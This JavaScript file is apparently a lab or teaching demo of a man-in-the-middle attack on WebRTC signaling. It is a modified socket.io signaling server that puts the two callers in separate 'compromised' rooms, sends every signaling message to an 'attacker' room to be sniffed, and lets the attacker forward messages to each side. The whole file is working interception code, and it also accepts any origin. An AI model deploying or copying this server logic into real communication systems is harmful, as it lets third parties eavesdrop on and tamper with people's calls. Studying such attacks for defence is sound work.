'use strict';

var os = require('os');
var nodeStatic = require('node-static');
var http = require('http');
var socketIO = require('socket.io');

var compromisedroom1 = "bad1";//compromised room for caller 1
var compromisedroom2 = "bad2";//compromised room for caller 2
var numClients = 0;

var fileServer = new(nodeStatic.Server)();
var app = http.createServer(function(req, res) {
  fileServer.serve(req, res);
}).listen(8080);

var io = socketIO.listen(app);
io.set('origins', '*:*');
io.sockets.on('connection', function(socket) {

  // convenience function to log server messages on the client
  function log() {
    var array = ['Message from server:'];
    array.push.apply(array, arguments);
    socket.emit('log', array);
  }

  //all messages filtered through attacker
  socket.on('message', function(message, room) {
    log('Attacker Sniffed: ', message);
    socket.to("mitm").emit('sniff', message, room);
    log("sniffed message:", message);
    // for a real app, would be room-only (not broadcast)
    //socket.broadcast.emit('message', message);
  });



  socket.on('forward_ToA', function(message, room) {
    log('Message forwarded to A: ', message);
    try{
      socket.to('bad1').emit('message', message);
    }catch(e){
      log(e);//debug for when 2nd room not yet open
    }
  });

  socket.on('forward_ToB', function(message, room) {
    log('Message forwarded to B: ', message);
    try{
      socket.to('bad2').emit('message', message);
    }catch(e){
      log(e);//debug for when 2nd room not yet open
    }
  });

  socket.on('create or join', function(room) {
    //MiTM
    if(room === "mitm"){
      socket.join(room);
      socket.emit("set attacker");
      numClients++;
    }else{
    
    log('Received request to create or join room ' + room);

   // var clientsInRoom = io.sockets.adapter.rooms[room];
    //var numClients = clientsInRoom ? Object.keys(clientsInRoom.sockets).length : 0; 
    //delted as we now separate into rooms
    log('Room ' + room + ' now has ' + numClients + ' client(s)');

    if ((numClients%2) === 1) {
      room = compromisedroom1;
      socket.join(room);
      log('Client ID ' + socket.id + ' created room ' + compromisedroom1);
      socket.emit('created', room, socket.id);
      numClients++;

    } else if ((numClients%2) === 0) {
      room = compromisedroom2;
      log('Client ID ' + socket.id + ' joined room ' + compromisedroom2);
      io.sockets.in(compromisedroom1).emit('join', compromisedroom1);//I think we need to signal to first room to kick off process
      socket.join(compromisedroom2);
      socket.emit('joined', compromisedroom2, socket.id);
      io.sockets.in(room).emit('ready');
      numClients++;
    } else { // max two clients
      socket.emit('full', room);
    }
  }});

  socket.on('ipaddr', function() {
    var ifaces = os.networkInterfaces();
    for (var dev in ifaces) {
      ifaces[dev].forEach(function(details) {
        if (details.family === 'IPv4' && details.address !== '127.0.0.1') {
          socket.emit('ipaddr', details.address);
        }
      });
    }
  });

  socket.on('bye', function(){
    console.log('received bye');
    numClients--;
  });

});
